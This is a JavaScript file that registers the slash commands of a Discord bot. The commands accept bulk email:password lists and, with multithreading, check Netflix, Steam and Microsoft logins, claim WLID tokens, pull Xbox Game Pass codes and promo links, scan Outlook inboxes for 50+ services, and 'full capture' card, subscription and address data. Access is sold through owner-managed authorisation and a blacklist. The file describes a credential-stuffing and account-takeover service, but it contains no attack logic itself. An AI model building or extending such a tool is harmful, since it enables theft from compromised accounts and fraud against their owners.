// ============================================================
//  Register slash commands with Discord
//  Run once:  node src/deploy-commands.js
// ============================================================

const { REST, Routes, SlashCommandBuilder } = require("discord.js");
const { BOT_TOKEN, CLIENT_ID } = require("./config");

const commands = [
  new SlashCommandBuilder()
    .setName("check")
    .setDescription("Check Microsoft codes against WLID tokens")
    .addStringOption((o) => o.setName("wlids").setDescription("WLID tokens (comma-separated)").setRequired(false))
    .addAttachmentOption((o) => o.setName("codes_file").setDescription("Text file with codes (one per line)").setRequired(false))
    .addStringOption((o) => o.setName("codes").setDescription("Codes (comma-separated)").setRequired(false))
    .addIntegerOption((o) => o.setName("threads").setDescription("Threads (1-100, default 10)").setMinValue(1).setMaxValue(100)),

  new SlashCommandBuilder()
    .setName("claim")
    .setDescription("Claim WLID tokens from Microsoft accounts")
    .addAttachmentOption((o) => o.setName("accounts_file").setDescription("Text file with email:password per line").setRequired(false))
    .addStringOption((o) => o.setName("accounts").setDescription("Accounts (comma-separated)").setRequired(false))
    .addIntegerOption((o) => o.setName("threads").setDescription("Threads (1-50, default 5)").setMinValue(1).setMaxValue(50)),

  new SlashCommandBuilder()
    .setName("pull")
    .setDescription("Fetch codes from Xbox Game Pass accounts and validate them")
    .addAttachmentOption((o) => o.setName("accounts_file").setDescription("Text file with email:password per line").setRequired(false))
    .addStringOption((o) => o.setName("accounts").setDescription("Accounts (comma-separated)").setRequired(false)),

  new SlashCommandBuilder()
    .setName("promopuller")
    .setDescription("Fetch promo links from Xbox Game Pass accounts (links only)")
    .addAttachmentOption((o) => o.setName("accounts_file").setDescription("Text file with email:password per line").setRequired(false))
    .addStringOption((o) => o.setName("accounts").setDescription("Accounts (comma-separated)").setRequired(false)),

  new SlashCommandBuilder()
    .setName("wlidset")
    .setDescription("Set WLID tokens for /check (owner only)")
    .addAttachmentOption((o) => o.setName("wlids_file").setDescription("Text file with WLID tokens").setRequired(false))
    .addStringOption((o) => o.setName("wlids").setDescription("WLID tokens (comma-separated)").setRequired(false)),

  new SlashCommandBuilder()
    .setName("auth")
    .setDescription("Authorize a user (owner only)")
    .addUserOption((o) => o.setName("user").setDescription("User to authorize").setRequired(true))
    .addStringOption((o) => o.setName("duration").setDescription("Duration (1h, 7d, 30d, 1mo, forever)").setRequired(true)),

  new SlashCommandBuilder()
    .setName("deauth")
    .setDescription("Remove a user's authorization (owner only)")
    .addUserOption((o) => o.setName("user").setDescription("User to deauthorize").setRequired(true)),

  new SlashCommandBuilder().setName("authlist").setDescription("List all authorized users"),

  new SlashCommandBuilder()
    .setName("blacklist")
    .setDescription("Permanently block a user (owner only)")
    .addUserOption((o) => o.setName("user").setDescription("User to blacklist").setRequired(true))
    .addStringOption((o) => o.setName("reason").setDescription("Reason").setRequired(false)),

  new SlashCommandBuilder()
    .setName("unblacklist")
    .setDescription("Remove a user from the blacklist (owner only)")
    .addUserOption((o) => o.setName("user").setDescription("User to unblacklist").setRequired(true)),

  new SlashCommandBuilder().setName("blacklistshow").setDescription("Show all blacklisted users"),
  new SlashCommandBuilder().setName("stats").setDescription("Show bot status"),
  new SlashCommandBuilder().setName("help").setDescription("Show available commands"),

  new SlashCommandBuilder().setName("admin").setDescription("[ADMIN] View admin control panel"),
  new SlashCommandBuilder()
    .setName("setwebhook")
    .setDescription("[ADMIN] Set webhook URL")
    .addStringOption((o) => o.setName("url").setDescription("Discord webhook URL").setRequired(true)),
  new SlashCommandBuilder().setName("botstats").setDescription("[ADMIN] View detailed processing statistics"),

  new SlashCommandBuilder()
    .setName("rewards")
    .setDescription("Check Microsoft Rewards point balances")
    .addAttachmentOption((o) => o.setName("accounts_file").setDescription("Text file with email:password per line").setRequired(false))
    .addStringOption((o) => o.setName("accounts").setDescription("Accounts (comma-separated)").setRequired(false))
    .addIntegerOption((o) => o.setName("threads").setDescription("Threads (1-10, default 3)").setMinValue(1).setMaxValue(10)),

  new SlashCommandBuilder()
    .setName("inboxaio")
    .setDescription("Scan Hotmail/Outlook inboxes for 50+ services")
    .addAttachmentOption((o) => o.setName("accounts_file").setDescription("Text file with email:password per line").setRequired(false))
    .addStringOption((o) => o.setName("accounts").setDescription("Accounts (comma-separated)").setRequired(false))
    .addIntegerOption((o) => o.setName("threads").setDescription("Threads (1-10, default 3)").setMinValue(1).setMaxValue(10)),

  new SlashCommandBuilder()
    .setName("refund")
    .setDescription("Check accounts for refund-eligible purchases (14-day)")
    .addAttachmentOption((o) => o.setName("accounts_file").setDescription("Text file with email:password per line").setRequired(false))
    .addStringOption((o) => o.setName("accounts").setDescription("Accounts (comma-separated)").setRequired(false))
    .addIntegerOption((o) => o.setName("threads").setDescription("Threads (1-20, default 5)").setMinValue(1).setMaxValue(20)),

  new SlashCommandBuilder()
    .setName("netflix")
    .setDescription("Check Netflix accounts (email:password)")
    .addAttachmentOption((o) => o.setName("accounts_file").setDescription("Text file with email:password per line").setRequired(false))
    .addStringOption((o) => o.setName("accounts").setDescription("Accounts (comma-separated)").setRequired(false))
    .addIntegerOption((o) => o.setName("threads").setDescription("Threads (1-10, default 10)").setMinValue(1).setMaxValue(10)),

  new SlashCommandBuilder()
    .setName("steam")
    .setDescription("Check Steam accounts (user:password)")
    .addAttachmentOption((o) => o.setName("accounts_file").setDescription("Text file with user:password per line").setRequired(false))
    .addStringOption((o) => o.setName("accounts").setDescription("Accounts (comma-separated)").setRequired(false))
    .addIntegerOption((o) => o.setName("threads").setDescription("Threads (1-15, default 15)").setMinValue(1).setMaxValue(15)),
  new SlashCommandBuilder()
    .setName("xboxchk")
    .setDescription("Xbox Full Capture Checker (CC, subs, points, address)")
    .addAttachmentOption((o) => o.setName("accounts_file").setDescription("Text file with email:password per line").setRequired(false))
    .addStringOption((o) => o.setName("accounts").setDescription("Accounts (comma-separated)").setRequired(false))
    .addIntegerOption((o) => o.setName("threads").setDescription("Threads (1-50, default 30)").setMinValue(1).setMaxValue(50)),
].map((c) => c.toJSON());

const rest = new REST({ version: "10" }).setToken(BOT_TOKEN);

(async () => {
  try {
    console.log("Registering slash commands...");
    await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
    console.log("Slash commands registered successfully.");
  } catch (error) {
    console.error("Failed to register commands:", error);
  }
})();
